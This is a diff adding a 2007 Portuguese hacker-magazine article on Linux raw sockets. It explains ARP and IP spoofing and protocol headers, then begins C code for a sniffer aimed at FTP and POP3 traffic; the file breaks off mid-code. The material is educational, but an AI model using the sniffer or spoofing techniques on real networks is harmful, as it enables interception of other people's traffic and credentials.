@@ -1,0 +1,2108 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x02 <---> Edicao 0x01 <---> Artigo 0x06 ]
+
+
+.> 14 de Fevereiro de 2007,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            O Guia do Raw Socket e Ataques em Ambientes de Rede
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+.> 26 de Janeiro de 2007                             (iniciado em 04/07/2006)
+.> hash < hash [at] gotfault [dot] net >
+.> sandimas < julio [at] rfdslabs [dot] com [dot] br >
+
+
+ "Hackers of the world, unite!"
+                 (capa do album "Hack", do Information Society)
+
+                                         "Fora do momento nada existe."
+                                                 (Sick Boy, Trainspotting)
+
+[ --- Indice
+
++     1.     <---> Introducao
++       1.1.  <->     Pre-requisitos
++     2.     <---> Escrevendo codigos com raw sockets em Linux
++       2.1.  <->     Raw Ethernet
++         2.1.1. <->     Cabecalho ethernet
++       2.2. <-->  Raw IPv4
++         2.2.1. <->  Como criar e utilizar raw IP sockets
++         2.2.2. <->  Informacoes basicas sobre os headers dos protocolos TCP/IP
++             2.2.2.1. <->   Protocolo IP versao 4
++             2.2.2.2. <->   Protocolo TCP
++             2.2.2.3. <->   Protocolo UDP
++             2.2.2.4. <->   Protocolo ICMP
++         2.2.3. <->  Exemplos de implementacao de raw IP socket
++             2.2.3.1. <->   Simples sniffer de FTP e POP3
++             2.2.3.2. <->   Exemplo nao-malicioso de um backdoor "port-knocking"
++             2.2.3.3. <->   Exemplo de envio de pacotes UDP e ICMP customizados
++         2.2.4. <->  Topicos sobre seguranca e ataques no TCP/IP
++             2.2.4.1. <->   IPv4 spoofing
++             2.2.4.2. <->   Sequestro de sessao
++             2.2.4.3. <->   Flooding e outros tipos de
+                             denial of service (DoS, DDoS e DrDoS)
++             2.2.4.4. <-> Ataques de fragmentacao
++             2.2.4.5. <-> Armadilhas do ICMP
++     3.     <---> Exemplos "vida real"
++       3.1.  <->   rrapt: Route Redirection ARP Poisonning Tool
++       3.2.  <->   Rose attack, Teardrop e Land
++       3.3.  <->   DNS Amplification Attacks
++       3.4.  <->   Smurf attacks
++     4.     <---> Fim
++       4.1.  <->   Agradecimentos
++       4.2.  <->   Referencias
++     5.     <---> Tarball do rrapt
+
+
+[ --- 1. Introducao
+
+   Este artigo e' destinado a descrever como e' feito o uso de raw sockets em
+Linux e mostrar ao leitor quao poderosos sao esse tipo de socket.
+Tambem serao discutidos diversos tipos de ataques envolvendo os protocolos ARP
+e TCP/IP como forma de complemento dos estudos em raw e seguranca.
+
+O assunto foi selecionado devido a carencia de um material em lingua portuguesa
+que englobasse os dois tipos de raw sockets mais utilizados e que faca demons-
+tracoes praticas, claras e relativamente satisfatorias.
+
+Todos os testes e codigos foram feitos usando um computador Athlon XP 1700+ e
+Pentium III 750 MHz, ambos com Slackware Linux 10.1 e gcc-3.3.4.
+
+O uso das informacoes contidas aqui devem servir apenas para fins educacionais.
+Nem os autores nem a The Bug! Magazine se responsabilizam pelos atos que possam
+ocorrer com o uso indevido das informacoes deste artigo.
+
+Caso sejam encontrados quaisquer erros neste documento, seja na parte tecnica
+ou codigos, favor informar diretamente os autores para que possa ser gerada
+uma errata no proximo numero.
+
+[ --- 1.1. Pre-requisitos
+
+   E' de requisito inicial que o leitor tenha nocoes basicas de programacao em
+C e Berkeley sockets, alem de conhecimento basico dos protocolos de rede que
+serao abordados ao longo do texto. Um computador e um dispositivo pensante
+tambem e' util :)
+
+
+[ --- 2. Escrevendo codigos com raw sockets em Linux
+
+   Aqui comecaremos a tratar tecnicamente sobre o assunto. Mas antes de tudo
+iremos iniciar respondendo uma pergunta: o que sao raw sockets?
+
+Grosso modo, raw socket e' um tipo especial de socket que nos permite ter aces-
+so direto a todo o conteudo de um pacote, seja ele dados ou cabecalho. Desta
+forma podemos ler todo esse conteudo ou ate' mesmo altera-lo da maneira que
+quisermos. Com isso temos controle total sobre os frames Ethernet ou pacotes
+TCP/IP que entram ou saem no sistema.
+
+Em sockets comuns a biblioteca padrao e o kernel do sistema tratam de todos os
+detalhes envolvidos na criacao dos pacotes, como os seus cabecalhos, etc. Em
+raw todo esse trabalho feito pelo kernel agora sera' transferido para o progra-
+mador, que ira' definir de acordo com sua necessidade e intencao os pormenores
+de cada pacote enviado.
+
+O conhecimento de programacao com raw sockets e' imprescindivel para qualquer
+desenvolvedor que programe para redes.
+
+[ --- 2.1.  Raw ethernet 
+
+   Em uma rede interna (intranet) quem manda e' o sujeito chamado MAC address
+(endereco de hardware), mais especificamente a indentificacao fisica de sua
+placa de rede ou numero de serie, como preferem alguns.
+Esse endereco e' unico (tudo bem que eu ja vi duas placas com o mesmo MAC add-
+ress na rede mas isso e' culpa de algum coreano bebado) e serve para distinguir
+a sua maquina do restante da rede.
+
+O endereco IP em uma rede interna, para a maquina, e' mera formalidade, pois
+quem manda mesmo e' o MAC address.
+Um tipo de ataque muito conhecido se chama "IP spoofing", e sera' tratado com
+mais detalhes adiante no paper. Outro ataque um pouco menos popular mas igual-
+mente nocivo chama-se "ARP spoofing", onde e' possivel enganar a rede local se
+passando por uma outra estacao que o atacante nao e'.
+
+Segue uma breve descricao para fins de comparacao entre um e outro metodo:
+
+"IP spoofing" consiste em falsificar um IP valido, tomar a identidade de outra
+maquina em uma rede interna ou na internet afim de burlar um firewall ou demais
+mecanismos de seguranca. A maquina que falsifica esse endereco IP garante que a
+maquina original nao responda mais devido a algum ataque DoS ou similar e sendo
+assim nao se intrometa na conexao falsificada.
+
+"ARP spoofing" e' muito semelhante, contudo, falsifica o endereco MAC em uma
+rede local, portanto e' natural perceber que esse tipo de ataque somente
+funciona em uma rede interna, na internet o MAC Address e' substituido pelo
+enderacamento IP como assim ordena o protocolo TCP/IP. Assim como o "spoofing"
+de IP o "ARP spoofing" para ser bem sucedido tambem precisa que a maquina ori-
+ginal esteja impossibilitada de comunicacao com o alvo para nao gerar um tipo
+de ruido chamado "ACK storm", ou uma bela confusao, em outras palavras. 
+
+                    Ambiente normal (fig. 2.1.0)
+|--------------------------------------------------------------------------|
+|                                                                          |
+|       +-> Client (10.10.10.2)                    +-> Server (10.10.10.3) |
+|       |                                          |                       |
+|   +--------+       dados --->                 +--------+                 |
+|   | HOST A |----------------------------------| HOST B |                 |
+|   +--------+                  <--- dados      +--------+                 |
+|       |                                                                  |
+|       |                                                                  |
+|       +-> Mac Addr: 00:00:A7:90:0F:43                                    |
+|                                                                          |
+|--------------------------------------------------------------------------|
+
+  No ambiente normal o cliente possui o mac address 00:00:A7:90:0F:43.
+
+O server, de tempos em tempos, atualiza sua tabela ARP, que contem todos os
+enderecos MAC das maquinas da rede. Toda vez que um "ping" e' executado essa
+tabela e' atualizada para refletir o ambiente fisico da rede. Para o HOST B o
+endereco IP de HOST A e' apenas formalidade (ta' bom ta' bom, nao e' 100% ver-
+dade, mas pra gente agora e') entao se voce raciocinar vai perceber que se
+alguem disser ao server que o endereco MAC relativo ao IP 10.10.10.2, por exem-
+plo, nao e' mais 00:00:A7:90:0F:43 mas sim 00:00:77:A1:00:44, que pertence ao
+IP 10.10.10.4 (maquina invasora), as coisas mudam de figura. O server vai acre-
+ditar que 10.10.10.4 e' 10.10.10.2 e os pacotes enviados a vitima 10.10.10.2
+acabarao no invasor 10.10.10.4 :) 
+
+   Uma demonstracao de ataque via ARP spoofing e o respectivo codigo serao
+detalhados mais adiante, agora um pouco de detalhes do cabecalho ARP, muito
+importante para o melhor entendimento desse capitulo. 
+ 
+
+[ --- 2.1.1. Cabecalho ethernet 
+
+ARP Header:
+
+            +------------------------------------------+
+         1->|  Hardware Type     |   Protocol Type     |->2    |-> ARP Request
+            |------------------------------------------|       |-> ARP Reply
+  3 hlen +->|     HLEN |  PLEN   |   Operation         |->5 <--|-> RARP Request
+         |  |------------------------------------------|       |-> RARP Reply 
+  4 plen +  |                Origem MAC                |->6
+            |------------------------------------------|
+            |                Origem IP                 |->7
+            |------------------------------------------|
+            |                Destino MAC               |->8
+            |------------------------------------------|
+            |                Destino IP                |->9
+            +------------------------------------------+
+            +                  DADOS                   +->10
+	    +------------------------------------------+
+
+
+O header ethernet contem:
+
+   . Endereco ethernet de destino (6 bytes).
+   . Endereco ethernt de origem (6 bytes).
+   . Frame type. O frame type e' 0x0806 hexadecimal para ARP e 0x8035 para RARP 
+
+O pacote encapsulado de dados ARP fica entao assim:
+
+   1. Tipo de endereco de rede (2 bytes). 1=ethernet.
+   2. Protocol mapeado( 2 bytes). 0800H (hexadecimal) = Endereco IP.
+   3. Campo que indica o tamanho do endereco de rede (1 byte). 6
+   4. Campo que indica o tamanho do endereco IP (1 byte). 4
+   5. Operation. 1 = ARP request, 2=ARP reply, 3=RARP request, 4=RARP reply.
+   6. Endereco de origem mac (6 bytes)
+   7. Endereco de origem IP (4 bytes)
+   8. Endereco de destino mac (6 bytes)
+   9. Endereco de destiono IP (4 bytes) 
+  10. Dados
+
+
+[ --- 2.2. Raw IPv4
+
+   Sem mais delongas, aqui trataremos de raw sockets em Internet, na camada IP
+versao 4.
+Tenha em mente que alguns codigos foram feitos e testados em rede local e pode
+ser que precisem de alguma modificacao para funcionar em um ambiente real. 
+
+[ --- 2.2.1. Como criar e utilizar raw IP sockets
+
+   Apos sabermos o que e' o famoso raw iremos aprender, primeiramente, a
+faze-los. Como alguns ja' sabem, a "system call" socket(2) e' a responsavel por
+criar todo tipo de socket de comunicacao em sistemas UNIX e criar sockets em
+raw nao seria diferente. Para informacoes mais detalhadas sobre raw e' recomen-
+dado ver a "man page" de raw(7).
+
+     - - O trecho abaixo foi extraido da pagina de manual de socket(2) - -
+
+       SYNOPSIS
+       #include <sys/types.h>
+       #include <sys/socket.h>
+
+       int socket(int domain, int type, int protocol);
+       ...
+       SOCK_RAW
+       Provides raw network protocol access.
+
+Como e' possivel observar, existe um tipo especifico para raw. Devemos tambem
+saber de antemao que podemos usar esses sockets especiais somente se tivermos
+privilegios de root[!] ou as "kernel capabilities" CAP_NET_RAW. Perceba que no
+terceiro argumento de socket(2) nos devemos escolher um protocolo especificado
+na RFC 1700.
+
+Se usado com outra "syscall" muito importante chamada setsockopt(2) e' possi-
+vel manipular com maior facilidade e flexibilidade o nosso socket.
+
+   - - O trecho abaixo foi extraido da pagina de manual de setsockopt(2) - -
+
+       SYNOPSIS
+       #include <sys/types.h>
+       #include <sys/socket.h>
+       ...
+       int setsockopt(int s, int level, int optname,  const  void
+       *optval, socklen_t optlen);
+
+Veremos mais a frente uso especifico dessa "syscall" e quao util ela nos vai
+ser.
+
+Como em nossos exemplos iremos trabalhar com sockets nao-conectados, o envio
+de pacotes sera' feito por sendto(2) -- lembre-se que era assim que usavamos
+para UDP (datagram sockets).
+
+Para aqueles que ja' tem experiencia com programacao em socket, vale ressaltar
+que e' possivel usar bind(2) junto com raw sockets. O que essa funcao ira' fa-
+zer e' atrelar um endereco IP da interface local ou de alguma outra especifica
+que a nossa interface de rede possua. Se bind(2) nao for chamada o kernel pre-
+enche o campo "IP origem" com um IP valido para a interface que estamos usando.
+Tambem podemos usar connect(2) com raw sockets. O que connect(2) ira' fazer e'
+atrelar um IP de destino para o envio e deixa-lo sempre fixo.
+Desta maneira podemos usar as "syscalls" send(2), recv(2), write(2), entre ou-
+tras que ja' nos sao familiares. Vale tambem citar que o uso de bind(2) e
+connect(2) sao opcionais e raros em raw e nao serao usados em nossos futuros
+exemplos.
+
+Apos todos os passos acima nos teremos um socket raw que pode aceitar e/ou en-
+viar pacotes no protocolo escolhido. Desta forma o kernel do sistema, apos ve-
+rificar algumas informacoes basicas do pacote como o seu "checksum", entrega
+uma copia do datagrama recebido para todos os sockets raw que estao "escutando"
+em um determinado protocolo. [*]
+
+[*] PS: Esta propriedade de entregar uma copia para todos os sockets de um cer-
+        to protocolo ira' nos permitir a criacao de um simples "sniffer" mais a
+        frente.
+
+[!] NOTA: Apos a criacao do socket e' recomendavel voltar ao nivel de privile-
+          gio anterior usando setuid(2) em combinacao com getuid(2) por ques-
+          toes de seguranca.
+
+Agora que ja' sabemos como criar raw sockets, podemos partir para o proximo to-
+pico, que trata sobre informacoes do TCP/IP, com enfase nos "headers" dos pro-
+tocolos. Mais a frente no texto iremos ver exemplos completos, logicamente
+incluindo a criacao de sockets raw.
+
+
+[ --- 2.2.2. Informacoes basicas sobre os headers dos protocolos TCP/IP
+
+   Antes de tudo, assumimos que o leitor tenha familiaridade com os principios
+basicos dos protocolos que compoem a suite TCP/IP. Nesta secao iremos apresen-
+tar os cabecalhos dos protocolos IP, TCP, UDP e ICMP, bem como as suas estru-
+turas nos arquivos que se encontram no diretorio '/usr/include/netinet'.
+
+
+[ --- 2.2.2.1. Protocolo IP (versao 4)
+
+   Como sabemos, IP e' o protocolo responsavel pelo roteamento e entrega de da-
+dos atraves da internet. O IP e' um protocolo que fica localizado na camada de
+rede, tendo como camada anterior a de transporte, e proxima a camada de enlace.
+Os cabecalhos em C pode ser encontrado em '/usr/include/netinet/ip.h'.
+
+Segue abaixo uma representacao do cabecalho IP, em ASCII:
+
+
+   Cabecalho IP (fig. 2.2.0)                   [adaptado do RFC 791]
+   +-----------+-----------+-----------------+---------------------+
+   |  Versao   |    IHL    | Tipo de servico |    Tamanho total    |
+   | (4 bits)  | (4 bits)  |     (8 bits)    |       (16 bits)     |
+   +-----------+-----------+-----------------+---------------------+
+   |            Identificacao             |  Flags   | Offset frag |
+   |              (16 bits)               | (3 bits) |  (13 bits)  |
+   +---------------+---------------+-------------------------------+
+   |  Time to Live |   Protocolo   |       Checksum cabecalho      |
+   |    (8 bytes)  |   (8 bytes)   |          (16 bytes)           |
+   +---------------+---------------+-------------------------------+
+   |               End. de origem (source address)                 |
+   |                       (32 bits)                               |
+   +---------------+---------------+-------------------------------+
+   |               End. de destino (destination address)           |
+   |                           (32 bits)                           |
+   +---------------+---------------+-------------------------------+
+   |                    Opcoes                     |    Padding    |
+   |                   (24 bits)                   |    (8 bits)   |
+   +---------------+---------------+-------------------------------+
+   |                                                               |
+  <                             Dados                               >
+   |                                                               |
+   +----------------------------------------------------------------
+
+Versao: O campo versao e' usado para espeficar a versao do IP. Iremos trabalhar
+        com a versao 4 durante todo o texto.
+
+IHL: Conhecido como "Internet Header Length", ele armazena o tamanho do cabe-
+     calho IP em multiplos de 4 bytes. Por padrao (se nenhuma opcao for utili-
+     zada) tem o valor 5 (5 * 4 = 20 bytes) como minimo e 15 como maximo
+     (4 * 15 = 60 bytes -- usado quando a opcoes sao inclusas no pacote).
+
+Tipo de servico: Tambem conhecido como ToS (Type of Service), este campo define
+                 como os roteadores por onde o seu pacote irao passar deverao
+                 lidar com os dados.
+                 Existem diversas flags para escolha de prioridade no envio,
+                 maximizacao ou minimizacao da quantidade de dados enviados de
+                 uma so' vez, confiabilidade, etc.
+
+Tamanho total: Este campo (Total Length) contem um valor inteiro relativo ao
+               tamanho do pacote (cabecalho IP + dados). Datagramas possuem, no
+               maximo, 65535 bytes.
+               A maioria dos dispositivos de rede nao aceitam datagramas muito
+               grandes e provavelmente havera' fragmentacao caso o usuario
+               envie um pacote muito grande.
+
+Identificacao: ID e' usado para identificar fragmentos. Caso nao existam paco-
+               tes fragmentados, esse campo e' ignorado. ID e' geralmente in-
+               crementado a cada novo datagrama enviado e cada fragmento tem o
+               mesmo numero de identificacao do primeiro pacote fragmentado
+               enviado.
+
+Flags: Esse campo serve para dizer se um pacote nao e' fragmentado
+       (bit DF - Don't Fragment, valor 0x02) ou se ainda existem fragmentos a
+       serem enviados (bit MF - More Fragments, valor 0x01). Tambem tem a opcao
+       MDF (More and Don't Fragment, valor 0x03) ou sem flag (valor 0x00).
+
+Fragment offset: Contem a posicao do fragmento no datagrama original.
+                 O primeiro segmento possui offset 0.
+
+Time to live: Tempo de vida do pacote na internet, geralmente entre 32 e 64.
+              O seu valor indica o numero maximo de roteadores que o pacote
+              ira' passar e e' decrementado a cada "router" passado. Quando o
+              campo chega a 0 o pacote e' descartado e ao remetente e' enviada
+              uma mensagem de ICMP "Time exceeded".
+
+Protocolo: Este campo e' usado pelo IP para que ocorra sucesso na passagem do
+           pacote para a camada superior (desmultiplexacao).
+
+Checksum do cabecalho: Esse campo armazena o valor de um calculo feito afim de
+                       checar a integridade do cabecalho IP. Os outros cabeca-
+                       lhos possuem os seus proprios "checksums". Caso a perda
+                       de integridade seja detectada, o pacote e' descartado
+                       silenciosamente (ou seja, sem nenhum aviso ao usuario).
+
+Endereco de origem: Endereco IP da estacao que enviou os dados.
+
+Endereco de destino: Endereco IP da estacao a receber os dados.
+
+Opcoes: Diversas opcoes para roteamento, seguranca e manejamento dos pacotes.
+        Este campo e' raramente usado e nem todas as implementacoes TCP/IP o
+        suportam.
+        O aprofundamento neste campo "opcoes" foge do escopo deste artigo. Caso
+        queira se aprofundar mais, veja o RFC 791[@] ou as referencias no final
+        do texto.
+
+Padding: Enchimento de 8 bits para que o tamanho do pacote seja sempre multiplo
+         de 4 bytes.
+
+[@] RFC 791: "Internet Protocol" [Postel 1981].
+             (ftp://ftp.rfc-editor.org/in-notes/rfc791.txt)
+
+
+[ --- 2.2.2.2. Protocolo TCP
+
+   O protocolo TCP e' bastante complexo e se situa na camada de transporte do
+modelo OSI. O TCP e' orientado a conexao, significa que deve haver um canal
+logico para a realizacao da transferencia de dados, alem de prover confiabili-
+dade na entrega das informacoes -- por exemplo, assegura que elas irao chegar
+ordenadamente.
+Nao entraremos em maiores detalhes. Caso o leitor queira se aprofundar deve
+ir ate' a secao de referencias (recomenda-se fortemente a referencia 2).
+
+
+        Cabecalho TCP (fig. 2.2.1)   [adaptado da ref. 6]
+        +-----------------------+-----------------------+ \
+        |   Porta de origem     |    Porta de destino   |  \
+        |        (16 bits)      |         (16 bits)     |   \
+        +-----------------------+-----------------------+    \
+        |                Numero de sequencia            |     \
+        |                     (32 bits)                 |      \
+        +-----------------------------------------------+       \
+        |                 Acknowledgement               |        \
+        |                     (32 bits)                 |         \    Maximo
+        +-------+------+--------+-----------------------+          -- 192 bytes
+        | Off_D | Res. | Flags  |       Window          |         /
+        |  (4)  | (6)  |  (6)   |      (16 bits)        |        /
+        +-------+------+--------+-----------------------+       /
+        |        Checksum       |    Ponteiro Urgente   |      /
+        |       (16 bits)       |       (16 bits)       |     /
+        +-----------------------+------------+----------+    /
+        |               Opcoes              |  Padding  |   /
+        |              (24 bits)            | (8 bits)  |  /
+        +------------------------------------+----------+ /
+        |                                               |
+       <                    Dados                        >
+        |                   (...)                       |
+        +-----------------------------------------------+
+
+Porta de origem: Como o proprio nome diz, e' a porta usada pela estacao de ori-
+                 gem para emissao da informacao. E' utilizada pelo modulo TCP
+                 do kernel para identificar a aplicacao que enviou tais dados.
+
+Porta de destino: A porta usada pela estacao de destino para emissao a informa-
+                  cao. E' utilizada pelo modulo TCP do para identificar a apli-
+                  cacao no servidor que ira' receber os dados.
+
+Numero de sequencia: Numero usado para numerar os bytes do pacote. E' de extre-
+                     ma importancia quando usamos fragmentacao, pois somente
+                     com eles e' possivel saber como ordenar os pacotes corre-
+                     tamente.
+                     O numero de sequencia e' a "menina dos olhos" para ataques
+                     de "IP spoofing".
+
+Acknowledgement: Caso a flag 'ACK' esteja ativa esse campo contem o proximo nu-
+                 mero de sequencia esperado (o proximo segmento recebido deve
+                 ter esse numero como seu numero de sequencia).
+
+Data offset (Off_D):  Offset de dados. Informa ao stack TCP/IP onde comecam a
+                      parte de dados no pacote.
+
+Reserved (Res.): Valor reservado para uso futuro.
+
+Flags: Conjunto de bits sinalizadores. Um ou mais podem ser ligados ao mesmo
+       tempo. Esses flags podem sinalizar, por exemplo, a negociacao do fim de
+       uma conexao (FIN), uma desconexao abrupta (RST), a negociacao de um ini-
+       cio de conexao (SYN), entre outros.
+
+Window: Este campo e' usado para informar a outra ponta da conexao o numero de
+        bytes que podem chegar em um pacote de uma so' vez (varia de 1 a 65535
+        bytes.) Embora nao tao avancado, serve como um mecanismo de controle de
+        fluxo.
+
+Checksum: Calculo para checagem de integridade do cabecalho TCP e seus dados.
+
+Ponteiro urgente: Aponta para uma determinada regiao do pacote e os dados desta
+                  area sao encaradas como urgentes pelo receptor. A flag 'URG'
+                  deve estar ativa, caso contrario o conteudo do campo e' igno-
+                  rado.
+
+Opcoes: Este campo opcional indica diversas opcoes para melhoras e customizacao
+        de uma conexao. Por exemplo ha' a opcao "Maximum Segment Size" que in-
+        forma o tamanho maximo do segmento que pode ser recebido.
+        Nao utilizaremos este campo em nossos exemplos. Para maiores informa-
+        coes consulte as referencias no final do artigo.
+
+Padding: Enchimento 8 bits para que o tamanho do pacote seja sempre multiplo de
+         4 bytes.
+
+
+[ --- 2.2.2.3. Protocolo UDP
+
+   O protocolo UDP e' um protocolo situado na camada de transporte, orientado a
+datagrama e mais simples que o TCP. UDP nao da' nenhuma garantia acerca da
+transmissao dos pacotes: nao garante, por exemplo, que eles chegaram na mesma
+ordem ou ate' mesmo se chegaram. E' dever do programador fazer esse tipo de
+checagem. Quando estivermos programando usando UDP tambem devemos nos preocupar
+com o tamanho dos nosso pacote -- isto e', devemos evitar uma possivel fragmen-
+tacao (lembre-se que o UDP nao gerencia sequencia de pacotes como o TCP).
+
+
+        Cabecalho UDP (fig. 2.2.2)   [adaptado da ref. 6]
+        +-----------------------+-----------------------+ 
+        |     Porta de origem   |   Porta de destino    |  \
+        |       (16 bits)       |       (16 bits)       |   \
+        +-----------------------+-----------------------+    -- 8 bytes
+        |        Tamanho        |       Checksum        |   /
+        |       (16 bits)       |       (16 bits)       |  /
+        +-----------------------+-----------------------+ 
+        |                                               |  \
+       <                      Dados                      >  -- Max. 65507 bytes
+        |                     (...)                     |  /    (teoricamente)
+        +-----------------------------------------------+
+
+Porta de origem: E' a porta usada pela estacao de origem para emissao da infor-
+                 macao. E' utilizada pelo modulo UDP do kernel para identificar
+                 a aplicacao que enviou tais dados.
+
+Porta de destino: A porta usada pela estacao de destino para emissao da informa-
+                  cao. E' utilizada pelo modulo UDP no kernel do receptor para
+                  achar a aplicacao no servidor que ira' receber os dados.
+
+Tamanho: Tamanho do pacote UDP (cabecalhos + dados).
+
+Checksum: Calculo para checagem de integridade do cabecalho UDP e seus possive-
+          is dados.
+          Segundo a referencia 2 o checksum no UDP nao e' obrigatorio.
+
+Dados: Informacoes que serao vistas pela aplicacao. Um pacote pode ter ou nao
+       dados.
+
+
+[ --- 2.2.2.4. Protocolo ICMP
+
+   ICMP e' um acronimo para "Internet Control Message Protocol" e e' comumente
+utilizado para comunicar mensagens de erros geralmente da camada IP ou de ou-
+tras camadas (geralmente TCP ou UDP -- principalmente esta ultima).
+
+Por exemplo, quando um pacote UDP nao pode ser entregue porque nao havia nenhum
+processo escutando nela e' enviada de volta um pacote "ICMP Port Unreachable".
+Caso o pacote nao consiga ser entregue devido a congestionamentos na rede, uma
+mensagem de "Destination (ou Host) Unreachable" e' enviada de volta.
+O uso mais comum do ICMP e' o 'ping', que envia mensagens "Echo Request" e es-
+pera por "Echo Reply". O intuito dessas mensagens e' saber se uma determinada
+maquina na rede esta' ou nao ativa [*].
+
+[*] Caso um IP nao responda a "Echo Request" nao necessariamente a maquina
+    esta' fora da rede. O computador pode simplesmente ignorar esses tipos
+    de requisicoes como medida de seguranca contra ataques de enumeracao,
+    entre outros.
+
+O arquivo de cabecalho que define o ICMP e' o '/usr/include/netinet/ip_icmp.h'.
+Caso queira entender melhor os exemplos que seguirao ou saber de todas as op-
+coes suportadas pela sua implementacao, olhe este arquivo!
+
+Vale salientar que sempre que um erro ICMP e' enviado, sua mensagem contem o
+cabecalho IP do pacote defeituoso e os primeiros 8 bytes do pacote que causou
+o erro.
+
+        Cabecalho ICMP (fig. 2.2.3)  [adaptado da ref. 2]
+        +-----------+-----------+-----------------------+ \
+        |   Tipo    |   Codigo    |      Checksum       |  \
+        |  (8 bits) |  (8 bits)   |      (16 bits)      |   \
+        +-----------+-----------+-----------------------+    \
+        |                                               |     -- Max. ?? bytes
+        |        O conteudo desta area depende          |    /
+        |             do tipo e codigo [?]              |   /
+        |                                               |  /
+        +-----------------------------------------------+ /
+
+[?]: Para exemplificar, o programa 'ping' coloca a hora exata do envio do paco-
+     te dentro da area de dados para que ao receber a resposta possa calcular o
+     "round-trip time", que significa, grosseiramente, o tempo que a resposta
+     levou para chegar.
+     Diversos codigos e tipos que informam erros nesta area de dados e' inclu-
+     sa parte do pacote causador do erro. Desta forma o emissor original da
+     mensagem pode saber qual aplicacao se mostrou defeituosa, ajustar controle
+     de fluxo, etc. (Inclusive veremos mais a frente um ataque que se utiliza
+     disso.)
+
+
+  Tabela de tipos e codigos ICMP (fig. 2.2.4)          [adaptado da ref. 2]
+---------------------------------------------------------------------------
+| Tipo | Codigo |                      Descricao                          |
+---------------------------------------------------------------------------
+|  0   |    0   | * Echo reply (resposta a pedido de eco)                 |
+---------------------------------------------------------------------------
+|      |        | * Destination unreachable:     (Destino inalcancavel)   | 
+|      |    0   | Network unreachable            (rede inancancavel)      |
+|      |    1   | Host unreachable               (maquina inalcancavel)   |
+|      |    2   | Protocol unreachable           (protocolo inalcancavel) |
+|      |    3   | Port unreachable               (porta inalcancavel)     |
+|      |    4   | Fragmentation needed buf DF bit set                     |
+|      |    5   | Source route failed                                     |
+|  3   |    6   | Destination network unknown                             |
+|      |    7   | Destination host unknown                                |
+|      |    8   | Source host isolated            [obsoleto]              |
+|      |    9   | Destination network administratively prohibited         |
+|      |    10  | Destination host administratively prohibited            |
+|      |    11  | Network unreachable for TOS                             |
+|      |    12  | Host unreachable for TOS                                |
+|      |    13  | Communication administratively prohibited               |
+|      |    14  | Host precedence violation                               |
+|      |    15  | Precedence cutoff in effect                             |
+---------------------------------------------------------------------------
+|  4   |    0   | Source quench (para controle de fluxo)                  |
+---------------------------------------------------------------------------
+|      |        | * Redirect:                                             |
+|      |   0    | Redirect for network                                    |
+|  5   |   1    | Redirect for host                                       |
+|      |   2    | Redirect for ToS and network                            |
+|      |   3    | Redirect for ToS and host                               |
+---------------------------------------------------------------------------
+|  8   |   0    | Echo request (pedido de eco)                            |
+---------------------------------------------------------------------------
+|  9   |   0    | Router advertisement                                    |
+|  10  |   0    | Router solicitation                                     |
+---------------------------------------------------------------------------
+|      |        | * Time exceeded: (Tempo excedido)                       |
+|  11  |   0    | TTL equals 0 during transit                             |
+|      |   1    | TTL equals 0 during reassembly                          |
+---------------------------------------------------------------------------
+|      |        | * Parameter problem:                                    |
+|  12  |   0    | IP header bad                                           |
+|      |   1    | Required option missing                                 |
+---------------------------------------------------------------------------
+|  13  |   0    | Timestamp request                                       |
+|  14  |   0    | Timestamp reply                                         |
+---------------------------------------------------------------------------
+|  15  |   0    | Information request [obsoleto]                          |
+|  16  |   0    | Information reply   [obsoleto]                          |
+---------------------------------------------------------------------------
+|  17  |   0    | Address mask request                                    |
+|  18  |   0    | Address mask reply                                      |
+---------------------------------------------------------------------------
+
+Os tipos e codigos mais importantes e comuns no cotidiano tem a sua traducao
+entre parenteses. Usaremos somente algumas das informacoes acima nos exemplos
+subsequentes.
+
+Checksum: Valor computado afim de assegurar a integridade do cabecalho ICMP e
+          seus dados.
+
+
+[ --- 2.2.3. Exemplos de implementacao de raw IP socket
+
+   Nesta secao iremos aplicar toda a teoria aprendida nos topicos anteriores.
+Tentaremos ser o mais claro e consisos durante esta etapa. Todos os codigos
+mostrados sao comentados para facilitar o entendimento.
+
+
+[ --- 2.2.3.1. Simples sniffer de FTP e POP3
+
+   Para fins de demonstracao segue o codigo de um pequeno sniffer de ftp e pop3
+muito basico, somente para ilustracao, aprendizado e fixacao dos conhecimentos
+adquiridos durante a leitura deste artigo.
+
+<++ sniffer-ftp-pop3.c ++>
+
+/*
+ * sniffer-ftp-pop3.c
+ *                    por Julio Cesar Fort <julio *NO_SPAM* rfdslabs com br>
+ *
+ * Exemplo para The Bug! Magazine 0x02 de um sniffer muuuiiito simples para os
+ * protocolos FTP e POP3. Somente para ilustrar o texto.
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+int main(void)
+{
+        char buffer[1024 * 8], *ptrdados, *ptraux;
+        int sockfd;
+        unsigned int i, n;
+
+        struct iphdr *iph;
+        struct tcphdr *tcph;
+
+        if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
+                fprintf(stderr, "Erro criando raw socket: %s\n",
+                                                         strerror(errno));
+                exit(-1);
+        }
+
+        fprintf(stdout, "Simples sniffer de ftp/pop3 usando raw sockets.\n");
+
+        while(1) {
+                memset(buffer, '\0', sizeof(buffer));
+
+                /* Faz a primeira parte do buffer conter cabecalhos IP */
+                iph = (struct iphdr *) buffer;
+
+                /* Logo apos o cabecalho IP, "adiciona" o cabecalho TCP */
+                tcph = (struct tcphdr *) (buffer + sizeof(struct iphdr));
+
+               /* Le o que foi recebido no socket */
+                n = read(sockfd, buffer, sizeof(buffer));
+
+                /* Pula os cabecalhos e aponta para a area de dados */
+                ptrdados = (buffer + (iph->ihl * 4) + (tcph->doff * 4));
+
+                /* Checa se o pacote contem dados, alem de cabecalhos */
